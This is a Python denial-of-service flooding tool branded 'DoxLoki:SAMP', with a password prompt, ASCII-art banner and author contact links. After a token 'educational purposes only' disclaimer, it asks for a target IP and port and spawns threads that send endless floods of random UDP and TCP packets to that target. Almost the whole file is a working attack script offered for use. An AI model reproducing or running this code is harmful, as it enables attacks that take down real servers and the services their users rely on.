import random
import socket
import threading
import os
import sys
import time
from time import sleep

os.system("clear")
password ="fuckyou"

for i in range(3):
	pwd = input("[•] PASSWORD: ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[•] WAIT 5 SECONDS ")
		break
	else:
		time.sleep(5)
		print("[×] WRONG PASSWORD!!! ")
		continue
time.sleep(5)
print("{√} Done Using Password \033[92mDoxLoki\033[0m ")
time.sleep(5)
os.system("clear")
print("\u001b[31m{√} Read first bro")
print("""\u001b[31m
#========================================#
|              WARNING!!!!               |
|                                        |
|DDoS is illegal, please remember|
|This tool is for educational purposes only      |
|if anyone misuses it        |
|Don't blame us      |
|tool Developer - @DoxLoki               |
#========================================#""")
time.sleep(5)
os.system("clear")
print("""\u001b[31m
    TOOLS BY DoxLoki || PLEASE DON'T ABUSE !!!
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠒⠋⠉⠉⠛⠿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠃⠀⠀⠀⠀⠀⠀⢃⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⢸⡀⠀⢸⣦⢰⡈⡆⠈⡟⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣇⣀⢰⣿⣿⣄⢸⣿⣿⣟⣷⠀⣷⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡸⣾⣿⣿⣿⣿⡿⠿⣿⡿⡏⢻⠁⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠻⣿⠛⠿⠈⠀⠀⠈⠀⣇⠈⣷⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣆⠀⣹⣦⠘⣧⠀⠀⠀⠀⠀⢀⣿⣀⣿⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣀⣿⣿⣆⠘⡷⠢⢤⡴⠖⢉⡏⢹⢹⡗⠻⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⢹⡿⣦⡼⡔⠊⠀⢠⣾⠀⡧⠘⡇⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⣿⠟⢻⣾⠓⠛⡇⢳⠄⢠⠟⡇⢠⡁⢠⠃⢀⠀⠀⣽⠀⠀⠀⠀⠀⠀⠀⣀⡤⠖⠒⠛⢦⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⠁⢴⢻⠈⣆⡀⣣⣸⡆⠀⠀⢹⣌⣷⡧⢼⣿⡀⠀⡇⠀⠀⠀⠀⠀⢠⡾⠋⠀⠀⠀⠀⠀⢱⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⠘⡀⡆⢉⣿⣿⡏⠁⠀⠀⠀⠈⠙⠁⠀⠚⠛⡄⢸⠀⠀⢀⣠⠔⠁⠀⠀⠀⠀⠀⠀⠀⢸⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡀⠀⢹⡃⡾⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⣸⠷⢒⠟⠁⠀⠀⢰⠆⠀⠀⠀⠀⠀⡎⠀
⠀⢀⡴⠒⠒⠲⠤⣀⣀⠀⠀⠀⠀⣇⠀⠀⠳⣇⠀⠀⠀⣀⠈⠀⠀⠀⠈⠉⠒⠚⢿⠏⢠⠔⠁⠀⠀⠀⢠⠏⠀⠀⠀⠀⠀⢸⠁⠀
⢠⠋⠀⠀⠀⠀⠀⠀⠈⠉⠒⠦⢄⣸⡀⠀⠀⠈⣖⢲⡚⠁⠀⠀⠒⠊⠁⠀⠀⠀⢸⡗⠁⠀⠀⠀⠀⡰⠃⠀⠀⠀⠀⠀⠀⢸⠀⠀
⢸⡄⠀⠀⠀⠀⠀⠰⡀⠀⠀⠀⠀⠈⠙⠒⢤⣀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠁⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⢀⡏⠀⠀
⠀⠱⣄⠀⠀⠀⠀⠀⠈⠑⠦⡀⠀⠀⠀⠀⠀⠈⠙⠢⣀⠀⠀⢀⣤⡀⠀⢀⡞⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠀
⠀⠀⠈⠣⡀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀⠀⠀⠀⠈⠓⠤⠼⡟⡅⠀⠙⠀⠀⠀⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⢀⡜⠀⠀⠀⠀
⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⢀⣄⣸⣧⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⢠⠎⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢦⡀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠁⠘⢿⣠⠃⠀⠀⠀⠀⠀⠀⠀⣸⠉⢦⣀⣀⣰⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠐⢦⡀⠀⠀⠀⠀⠀⠙⢄⠀⠀⠀⠀⠀⠀⠀⠀⠈⢃⡀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠈⠛⢠⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠢⣀⠀⠀⢀⠆⠀⠑⢤⡀⠀⠀⠀⠀⠀⠀⢈⣧⣀⠀⠀⠀⢀⣴⣿⠀⠀⠀⣀⠏⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠧⡀⠀⠀⠀⠀⠈⢳⣄⣀⣀⡠⠔⠋⠀⠀⠉⠉⠋⢉⡏⠙⣄⠀⣰⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠸⣧⠙⡄⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⡀⠹⣿⠉⣯⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣾⡟⢳⡿⠀⣵⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣄⢙⣿⣏⣩⠍⠿⣦⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠿⢿⠧⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡀⠀⠀⠀⢀⣸⡆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠥⠤⠐⠚⠀⣸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠯⠵⢶⠭⠽⠚⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⣀⢀⣀⡠⢔⡯⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠓⠒⠒⠒⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

\033[92m========= DoxLoki:SAMP =========
>> Author : @DoxLoki
>>> Coded By @DoxLoki
>>>> Youtube : @DoxLok1
>>>>> Telegram : https://t.me/DoxLoki""")
ip = str(input("[•] IP TARGET: "))
port = int(input("[•] PORT: "))
choice = str(input("[•] Attack ? (y/n) : "))
times = int(input("[•] PAKET: "))
threads = int(input("[•] THREADS : "))
os.system("clear")
def ddos():
	data = random._urandom(1024)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[31m DoxLoki ATTACKING TO\033[92m ➤ {}:{} \u001b[31m".format(ip, port))
		except:
			print("\033[92m [!] SERVER DOWN")

def ddos2():
	data = random._urandom(1025)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m DoxLoki ATTACKING TO\033[92m ➤ {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\033[92m [!] SERVER DOWN")

def ddos3():
	data = random._urandom(1025)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m DoxLoki ATTACKING TO\033[92m ➤ {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\033[92m [!] SERVER DOWN")

for y in range(threads):
	if choice == 'ddos':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	else:
	    th = threading.Thread(target = ddos3)
	    th.start()